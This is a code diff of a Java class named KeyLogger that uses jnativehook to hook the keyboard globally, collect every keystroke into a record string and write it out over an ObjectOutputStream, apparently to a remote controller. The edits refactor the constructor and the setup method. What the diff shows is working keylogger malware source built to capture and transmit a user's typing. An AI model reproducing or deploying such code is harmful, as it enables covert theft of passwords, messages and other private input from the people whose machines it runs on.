@@ -15,13 +15,13 @@ import org.jnativehook.keyboard.NativeKeyListener;
 
 
 public class KeyLogger implements NativeKeyListener {
-	String record;
+	public String record = "";
 	public ObjectOutputStream oos;
-	public String listProcess = "";
-
-	public KeyLogger(ObjectOutputStream oos) {
+	
+	public KeyLogger(ObjectOutputStream oos,String record) {
 		// TODO Auto-generated constructor stub
 		this.oos = oos;
+		this.record = record;
 	}
 
 	public void nativeKeyPressed(NativeKeyEvent e) {
@@ -45,7 +45,7 @@ public class KeyLogger implements NativeKeyListener {
 		//System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
 	}
 
-	public static void get_Keylogger(ObjectOutputStream oos) {
+	public void get_Keylogger(ObjectOutputStream oos) {
 		
 		  LogManager.getLogManager().reset();
 		  Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
@@ -62,7 +62,7 @@ public class KeyLogger implements NativeKeyListener {
 			System.exit(1);
 		}
 
-		GlobalScreen.addNativeKeyListener(new KeyLogger(oos));
+		GlobalScreen.addNativeKeyListener(new KeyLogger(oos,record));
 	}
 	public void send_KeyLogger() throws IOException {
 		oos.writeObject(this.record);
